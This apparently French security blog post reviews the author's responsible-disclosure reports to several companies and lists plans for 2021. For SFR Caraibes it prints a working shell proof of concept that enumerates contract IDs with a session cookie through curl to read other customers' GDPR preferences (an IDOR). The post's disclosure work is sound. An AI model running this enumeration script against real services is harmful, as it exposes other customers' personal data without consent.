---
layout: post
title: Securité, retours sur de la divulgation responsable
excerpt_separator:  <!--more-->
categories:
  - security
tags:
  - divulgation responsable
---
## TLDR;

Retour sur les divulgations responsables réalisées ([security log](/security-log)) et projets pour 2021.

![Burning steamer, Marcus Larson](/images/larson-burning-steamer.jpg)

<!--more-->

## Divulgations

### Carrefour

- Possibilité d'utiliser la cagnotte d'une autre personne et ticket de caisse contenant trop d'information personnelles
- [Rapport envoyé à Carrefour](/doc/secu/2019-09-19-app-carrefour-martinique.pdf)
- Expérience : seul un email au DPO semble avoir fait accélérer le process.

### SFR

- Plusieurs failles dans la version de la box.
- [Rapport envoyé à SFR](/doc/secu/2020-06-08-box-sfr.pdf)
- Experience : process très très long pour une résolution partielle. Création de PoCs qui n'ont jamais été discutées avec SFR.

### Odyssi

- Possibilité de récupérer les positions GPS des alertes à partir d'un email
- [Rapport envoyé à Odyssi](/doc/secu/2020-06-25-odyssi.pdf)
- Experience : correction très rapide (J+1).

### SFR Caraibes

- Présence du mot de passe SHA1 non salé dans la page et possiiblité d'accéder aux préférences RGPD des comptes.
- Email envoyé à SFR Caraibes

```
1. Les mots de passes de connexion à l'espace client sont stockés en SHA1, sans sel.
En se logguant puis en se rendant sur https://espaceclient.sfrcaraibe.fr/compte/r-moncomptePrincipal.php, on voit que le champs mot de passe est remplie, par la valeur hashée (SHA1) du mot de passe de connexion.
La connexion est sécurisée, donc l'impact est faible. Mais en cas d'attaque de la DB de connexion, les mots de passes seront retrouvés de façon triviale.

2. Accès aux préférences de gestion des données personnelles. La page https://espaceclient.sfrcaraibe.fr/rgpd/r-donneespersonnelles.php, est obtenue avec un ID (l'ID contrat). En passant un autre ID que le sien (tout en étant logué), il semble possible de récupérer les choix réalisés.
Dans le pire des cas, il serait alors possible également de les modifier, ce qui bien sur pose problème puisque ces préférences sont ensuite utilisées pour partager de l'information avec des tiers.
```

Le point 1. est validé mais SFR ne croit pas au point 2.

L'envoi du script ci-dessous permet de mettre en évidence le problème.
```
#!/bin/sh

PHPSESSID="xxx" # utiliser un cookie obtenu en se logguant sur https://espaceclient.sfrcaraibe.fr/

# On peut passer le cookie en paramètre
if [ $# -gt 0 ]; then
  PHPSESSID=$1;
fi

# K61237 => contrat de Guillem Lefait => refuse tout
# ..
# K61270 => contrat de ??             => refuse tout
# ..
# K61313 => contrat de ??             => refuse tout
# ..
# K61338 => contrat de ??             => refuse groupe + enquete
# ..
# K61616 => contrat de ??             => refuse tout

for i in {61235..61300}; do
	echo "$i ----------";
	curl 'https://espaceclient.sfrcaraibe.fr/rgpd/r-donneespersonnelles.php' \
        -H 'Content-Type: application/x-www-form-urlencoded' \
		-H "Cookie: PHPSESSID=${PHPSESSID}" \
		--data-raw "contrat=K$i" \
		--silent |
        grep -P '<input [^>]*type="radio"[^>]* checked="true">' | # on peut faire la même chose
        sed -r 's#^.*name="([^"]+)".*value="([^"]+).*$#\1\t\2#';          # avec les préférences de contact
done
```

- Expérience : traitement assez rapide (5 jours). J'aurais du faire un script immédiatement pour montrer le point 2. Le fait que les mots de passes soient stockés en SHA1 non salés n'a pas été adressé.

### Orange
- par email, en attente


## Projets 2021

1. Systématiser les rapports (pas uniquement des emails) pour garder une trame complète.

2. Mesurer le temps passé par projet.

3. Préparer une PoC minimale et vérifier si le sujet est hors-scope.

4. Faire du bug bounty pour tenter de percevoir en 2021, un gain financier supérieur à 2020. Soit toute somme supérieure à 0.
